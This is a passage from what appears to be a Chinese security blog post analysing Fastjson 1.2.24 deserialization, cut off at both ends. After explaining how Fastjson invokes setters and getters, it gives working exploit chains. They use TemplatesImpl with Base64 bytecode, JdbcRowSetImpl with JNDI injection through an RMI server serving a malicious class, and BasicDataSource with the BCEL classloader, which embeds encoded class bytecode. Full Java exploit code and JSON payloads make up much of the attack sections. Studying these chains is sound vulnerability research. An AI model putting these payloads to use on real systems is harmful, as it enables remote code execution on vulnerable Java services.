alt="image-20240408101235242"></p><p>总结：</p><blockquote><p>对于parse(json字符串)，结果会调用对应的set方法，以及构造函数，并且会调用静态方法，构造代码块。</p></blockquote><h3 id="parseObject方法："><a href="#parseObject方法：" class="headerlink" title="parseObject方法："></a>parseObject方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.hme.entity.Student\&quot;,\&quot;age\&quot;:23,\&quot;name\&quot;:\&quot;张三\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(str);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;反序列化二(parseObject)：&quot;</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(str);<br>        System.out.println(jsonObject);<br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/../../../blog_image/image-20240408102009020.png" alt="image-20240408102009020"></p><p>结论：</p><blockquote><p>JSON.parseObject会调用对应的对应的set和get方法，以及构造方法和构造代码块。</p></blockquote><p>如果指定类，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;反序列化三(parseObject + 类)：&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> JSON.parseObject(str, Student.class);<br>        System.out.println(student);<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/../../../blog_image/image-20240408102132644.png" alt="image-20240408102132644"></p><p>结论：</p><blockquote><p>使用parseObject(str,类.class)则会直接返回该类的实例，调用构造代码块，构造函数，以及set方法。</p></blockquote><h2 id="Feature-SupportNonPublicField："><a href="#Feature-SupportNonPublicField：" class="headerlink" title="Feature.SupportNonPublicField："></a>Feature.SupportNonPublicField：</h2><p>如果我们把name的set方法去掉，那么字段不会有结果，输出为null。<img src="/../../../blog_image/image-20240408105057482.png" alt="image-20240408105057482"></p><p>因为fastjson就是调用set方法去赋值的，对于我们的私有变量，没有set方法，所以不能直接赋值，而使用了<code>Feature.SupportNonPublicField</code>后就会调用反射去进行赋值：</p><p><img src="/../../../blog_image/image-20240408110831128.png" alt="image-20240408110831128"></p><p>总结：</p><blockquote><p>使用fastjson，如果对象的私有变量没有使用编写set方法，fastjson是默认不能进行赋值。而添加了Feature.SupportNonPublicField，可以在没有set方法的条件下进行赋值。</p></blockquote><h1 id="0x02-代码实现流程："><a href="#0x02-代码实现流程：" class="headerlink" title="0x02 代码实现流程："></a>0x02 代码实现流程：</h1><p>获取key：</p><p>在<code>DefaultJSONParser</code>的<code>parseObject</code>函数中：</p><p><img src="/../../../blog_image/image-20231211204647590.png" alt="image-20231211204647590"></p><p>如果当key是<code>JSON.DEFAULT_TYPE_KEY</code>（常量，是@type）则获取当前<code>@type</code>的值即json的vale，然后调用<code>TypeUtils</code>中加载器去加载当前的<code>typeName</code></p><p><img src="/../../../blog_image/image-20231211204558260.png" alt="image-20231211204558260"></p><p>加载过程在<code>TypeUtils.loadClass</code>中</p><p>mappings中存在当前这些加载器：<br><img src="/../../../blog_image/image-20231211205130793.png" alt="image-20231211205130793"></p><p>当前传入的加载器在这个map中不存在则继续往下，然后使用当前线程去创建另一个加载器：</p><p><img src="/../../../blog_image/image-20231211205415823.png" alt="image-20231211205415823"></p><p>然后会把这个加载器放进map中,最终返回。</p><p>返回ParseConfig类的getDeserializer中走到最后一步会创建javabean对象。</p><p>在parseConfig中最后会调用<code>JavaBeanDeserialize</code>函数去创建javabean </p><p><img src="/../../../blog_image/image-20231214163722619.png" alt="image-20231214163722619"></p><p>在<code>createJavaBeanDeserializer</code>方法中会采用asm技术去操作class，从而去动态生成对象。</p><p><code>JavaBeanInfo</code>函数中首先会遍历所有的方法获取到对应类型的set方法和get方法，然后去获取字段，主要是获取public,static的字段。</p><p>构造poc：</p><p>首先需要指定类型，因此使用@type指定序列化的类，这里选用<code>com.sun.rowset.JdbcRowSetImpl</code>，判断需要调用是get还是set方法，这里选用set方法。</p><p><img src="/../../../blog_image/image-20231214165957071.png" alt="image-20231214165957071"></p><p>这里toJSON最后才会调用set方法，如果调用get方法，前面可能会出错。</p><p>当我们指定字段<code>dataSourceName</code>就会调用<code>setDataSourceName</code>方法，如图，将我们的地址传入了：</p><p><img src="/../../../blog_image/image-20231214170746290.png" alt="image-20231214170746290"></p><p>而<code>setAutoCommit</code>方法也是一样：</p><p><img src="/../../../blog_image/image-20231214170902837.png" alt="image-20231214170902837"></p><p>之后会调用connect()方法</p><p>在connect方法中会调用<code>getDataSourceName</code>的方法，而这个DataSourceName参数是可控的，我们可以传入的，因此实现了jndi注入了。</p><p><img src="/../../../blog_image/image-20231214171048392.png" alt="image-20231214171048392"></p><p>在yakit中开启一个ldap服务，执行命令为calc，如图所示：</p><p><img src="/../../../blog_image/image-20231214171307785.png" alt="image-20231214171307785"></p><p>从而实现了运行任意命令。</p><p>小结：</p><blockquote><p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong></p><p>满足条件的setter：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>非静态方法</li><li>无参数</li><li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li></ul></blockquote><h1 id="0x03-TemplatesImpl利用链："><a href="#0x03-TemplatesImpl利用链：" class="headerlink" title="0x03 TemplatesImpl利用链："></a>0x03 TemplatesImpl利用链：</h1><h2 id="分析以及exp编写："><a href="#分析以及exp编写：" class="headerlink" title="分析以及exp编写："></a>分析以及exp编写：</h2><p>我们在学<code>TemplatesImpl</code>中知道它一个内部类<code>TransletClassLoader</code>的<code>defineClass</code>方法，调用了<code>ClassLoader</code>的<code>defineClass</code>。（这条链是cc3的，也出现在我们的类加载中。）</p><p>这条调用链是这样的：</p><blockquote><p><code>TemplatesImpl#getOutputProperties</code>–&gt;<code>TemplatesImpl#newTransformer</code>–&gt; <code>TemplatesImpl#getTransletInstance</code>–&gt; <code>TemplatesImpl#defineTransletClasses()</code>–&gt;<code>TemplatesImpl#defineClass()</code></p></blockquote><p>有个<code>getTransletInstance</code>和<code>getOutputProperties</code>正好符合我们的fastjson特性。</p><p>而选择<code>getTransletInstance</code>是调用失败的，因为该类返回的是一个抽象类。</p><p><img src="/../../../blog_image/image-20240408135134381.png" alt="image-20240408135134381"></p><p>因此选择<code>getOutputProperties</code>：</p><p>这个方法的返回值是<code>Properties</code>，不是返回的接口。</p><p><img src="/../../../blog_image/image-20240408135250693.png" alt="image-20240408135250693"></p><p>构造链也很简单：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span>className<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span>evalBytes<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;_tfactroy&quot;</span><span class="hljs-punctuation">:</span>new TransformerFactoryImpl()<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Calc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>完整poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        <span class="hljs-type">byte</span>[] evilBytes = readFile();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(evilBytes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + className + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + encode + <span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;Calc\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&#125;&quot;</span>;<br>        System.out.println(text1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> JSON.parseObject(text1, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>(), Feature.SupportNonPublicField);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFile() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要注意的点是<code>_tfactory</code>传入的值是一个类，然后<code>_bytecodes</code>传入的是一个byte数组，因此需要使用<code>[]</code>去包裹。最重要的是我们需要调用<code>getOutputProperties</code>方法，因此需要对其进行赋值，这个值也是一个类。</p><h2 id="疑惑："><a href="#疑惑：" class="headerlink" title="疑惑："></a>疑惑：</h2><h3 id="疑点1：为什么传入的-bytecodes要进行base64编码："><a href="#疑点1：为什么传入的-bytecodes要进行base64编码：" class="headerlink" title="疑点1：为什么传入的_bytecodes要进行base64编码："></a>疑点1：为什么传入的<code>_bytecodes</code>要进行base64编码：</h3><p>在<code>ObjectArrayCodec</code>中的<code>deserialze</code>方法中有一个方法是<code> lexer.bytesValue()</code>，会对传入的字符串进行base64解码。这个调用是在<code>DefaultJSONParser</code>的<code>deserializer.deserialze</code>调用的。</p><p><img src="/../../../blog_image/image-20240408132834764.png" alt="image-20240408132834764"></p><h3 id="疑点2：为什么需要传入ParserConfig方法："><a href="#疑点2：为什么需要传入ParserConfig方法：" class="headerlink" title="疑点2：为什么需要传入ParserConfig方法："></a>疑点2：为什么需要传入<code>ParserConfig</code>方法：</h3><p>其实这个方法有无都一样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>    <span class="hljs-type">byte</span>[] evilBytes = readFile();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(evilBytes);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + className + <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + encode + <span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;Calc\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&#125;&quot;</span>;<br>    System.out.println(payload);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> JSON.parseObject(payload,Feature.SupportNonPublicField);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] readFile() <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">return</span> Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h1 id="0x04-JdbcRowSetImpl利用链："><a href="#0x04-JdbcRowSetImpl利用链：" class="headerlink" title="0x04 JdbcRowSetImpl利用链："></a>0x04 JdbcRowSetImpl利用链：</h1><h2 id="JNDI-RMI："><a href="#JNDI-RMI：" class="headerlink" title="JNDI + RMI："></a>JNDI + RMI：</h2><p>就是简单的JNDI Reference 的攻击方式。</p><p><code>JdbcRowSetImpl </code>中有一个<code>setDataSourceName</code>，用于设置数据源。</p><p>生成一个<code>Calc.class</code>，然后启动一个http服务：</p><p><img src="/../../../blog_image/image-20240408150134295.png" alt="image-20240408150134295"></p><p>服务端如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calc.class&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8081/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(aa);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>, refObjWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/aa\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="JNDI-LDAP："><a href="#JNDI-LDAP：" class="headerlink" title="JNDI + LDAP："></a>JNDI + LDAP：</h2><p>还不太会，看师傅的博客：</p><p><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#2-JNDI-LDAP">Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析 | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="0x05-BasicDataSource链："><a href="#0x05-BasicDataSource链：" class="headerlink" title="0x05 BasicDataSource链："></a>0x05 BasicDataSource链：</h1><h2 id="关于BECL："><a href="#关于BECL：" class="headerlink" title="关于BECL："></a>关于BECL：</h2><p>BCEL(Byte Code Engineering Library)的全名是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。相较Commons Collections，BCEL被包含在原生JDK中，更容易被利用。</p><p>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面<br>在Tomcat中也会存在相关的依赖<br>tomcat7：org.apache.tomcat.dbcp.dbcp.BasicDataSource<br>tomcat8+：org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>com.sun.org.apache.bcel.internal.util.ClassLoader重写了Java内置的ClassLoader#loadClass()方法，会判断类名是否是<code>BCEL</code>开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩。</p><p>具体可以我的反序列化的类的动态加载那一篇文章。</p><p>前面我们使用了<code>JdbcRowSetImpl</code>和<code>TemplatesImpl</code>这两条链，其中jdbc那一条使用到了jndi注入，大部分情况下不能实现不出网利用，而<code>TemplatesImpl</code>这一条链虽然可以传入一个base64编码后的bytes，但是需要服务端开启<code>Feature.SupportNonPublicField</code>设置，因为它不存在set方法，这两条利用链算是有点苛刻。</p><p>但是这里的<code>BasicDataSource</code>则不一样了，在不出网不开启<code>Feature.SupportNonPublicField</code>的时候就可以利用这条链。</p><h2 id="编写BECL-Demo："><a href="#编写BECL-Demo：" class="headerlink" title="编写BECL Demo："></a>编写BECL Demo：</h2><p><code>Repository</code>主要是讲这个class生成一个java原生的字节码。</p><p><code>Utility</code>主要用于讲原生的class进行编码成BECL认识的格式。</p><p>这里使用<code>Class.forName</code>去获取class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(Class.forName(<span class="hljs-string">&quot;Calc&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(),<span class="hljs-literal">true</span>);<br>System.out.println(encode);<br></code></pre></td></tr></table></figure><p>还可以使用文件读取的方式，最终也是传入一个bytes给<code>Utility</code>jin’x</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>System.out.println(encode);<br></code></pre></td></tr></table></figure><p>如何进行类加载？</p><p>导入的是<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> +<span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b$af$b5$5d$HBB$S$9a$W$da$A$z$J$87$e6$c2$zQ$_$a8$95$aa$g$a8$IJ$d5$e3fY$c2$82$b1$91$e3$40$feQ$cf$b9$b4$I$a4$f6$ce$8fB$9du$a34Rj$c93$9e$f7$de$bc$9d$f1$3e$3e$dd$ff$C$b0$87$86$D$hk$O$9e$a3f$e1$85$c9$_9$d696$i$e4$f0$8a$e35G$9d$n$d7$d1$81$8e$df3$a4$h$cd$kCf$3f$3cU$M$cb$9e$O$d4$e1$e8$aa$af$a2$T$d1$f7$J$vz$a1$U$7eOD$da$d4S0$T$9f$eb$nyx$fb$c2$97m$G$ab$p$fd$a9$j$p$ba$ec$5d$88$h$d1$d2a$eb$d3$d1$87$b1T$d7$b1$O$D$92$e5$bb$b1$90$97$H$e2$3a$b1$a1$a1$Y$9cn8$8a$a4$fa$a8$8d$adm$ec$de$99$5e$X$O$9eql$ba$d8$c26$9dG$pH$Xo$f0$96$a1$f4$lo$86Z$82$fa$o$Y$b4$8eGA$ac$af$d4$8c4$5e$3bfC$f2$60$u$fc$T$k$f5$_$94$8c$ZV$Wzi$ae$81$8agE$b9$d1$f4$W4$b4OF$8d$VY$ee4$e6$d8n$i$e9$60$d0$9eo$f8$S$85R$N$87$d4$b06$af$3c9$8f$c2$5b$f3$p$da$cd$k$ea$b0$e8$d6$cc$93$C3$cbSt$a9jQf$94$b3$bb$3f$c1$s$J$9d$a7$98K$c04$96$u$ba$7f$FXF$81$b2$85$95Y$f3$Z$v$MW$bdC$aa$98$fe$81$cc$d7$ef$c8$7f$7e$40$ee$h$b9$f1$df$93$84$b4I$9a$r$a1$b1$ad$d0$971$b7$T$94$Tf$R$e6$cc$8e$c9$T$5eD$89$aaUz9R$kG$d9$s$a2$92LV$fd$D$M$f3$G$J$84$C$A$A&quot;</span>).newInstance();<br></code></pre></td></tr></table></figure><p>因为这个loadClass方法是public，可利用点很大。</p><p><img src="/../../../blog_image/image-20240416094016948.png" alt="image-20240416094016948"></p><p>主要逻辑是判断是否是以<code>&quot;$$BCEL$$&quot;</code>开头，如果是则进行loadClass。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;aaa&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                 <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbn$daP$Q$3d$X$M6$8e$J$8f$U$f2h$9e$7d$C$L$yu$L$ea$a6J7u$93$wD$e9$fa$fa$e6$8a$5e062$97$88$3f$ea$9a$N$ad$ba$e8$H$f4$a3$aa$ccu$9eRZK$9e$f1$9c$99s$e6$8c$fc$e7$ef$af$df$A$de$e1$8d$L$H$9b$$$b6$b0$ed$60$c7$e4$e76v$5d$U$b0gc$df$c6$BC$b1$afb$a5$df3$e4$5b$ed$L$G$ebCr$v$Z$w$81$8a$e5$c9$7c$S$ca$f4$9c$87$R$n$f5$m$R$3c$ba$e0$a92$f5$zh$e9oj$c6$b0$j$88d$e2_$f2t$y$d30Y$f8$a1$90$91$7f$7c$a5$a2$k$83$d3$X$d1$ed$GF$8cF0$e2W$dc$8fx$3c$f4$8f$XBN$b5Jb$g$x$P4$X$e3$cf$7c$9a$v$93I$Gw$90$ccS$n$3f$w$b3$a9d$e4$ba$86$eb$a1$E$d7$c6$a1$87$p$bc$m$7dr$r$bar$n$3d$bc$c4$x$86$8d$7f$e8$7bx$N$97a$f3$3f$$$Z$aa$P$a4$d3p$q$85f$a8$3d$40g$f3X$ab$J$99p$87R$df$X$8dV$3bx2C$97X$e4E0$bcm$3d$ea$Ot$aa$e2a$ef1$e1K$9a$I9$9b$R$a12$a5$a6$ce$ee$3fO$b9$90t$97M$bf$cd$3c90s$z$c55$aa$7c$ca$8cr$a1$f3$Dl$99$b5$3d$8a$c5$M$cc$a3L$d1$bb$Z$c0$3a$w$94$jT$ef$c9$3c$T$D$ea$3f$91$ab$e7W$b0$be$7e$87$f3$a9$b3Bq$99$e1$r$e2$WH$c5$u6$e9$cb$e8$962$d4$se$H5R$ba$dbP$86Eu$9d$aa$Nzm$e4$C$h$cf$yj42S$cdk$dfl$i$C$80$C$A$A&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson-BECL组合拳："><a href="#fastjson-BECL组合拳：" class="headerlink" title="fastjson+BECL组合拳："></a>fastjson+BECL组合拳：</h2><p>看exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="hljs-string">&quot;\&quot;,\&quot;driverClassloader\&quot;: &#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parseObject(s);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">BasicDataSource</span> <span class="hljs-variable">basicDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BasicDataSource</span>();<br>        basicDataSource.setDriverClassLoader(classLoader);<br>        basicDataSource.setDriverClassName(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code);<br>        basicDataSource.getConnection();<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span 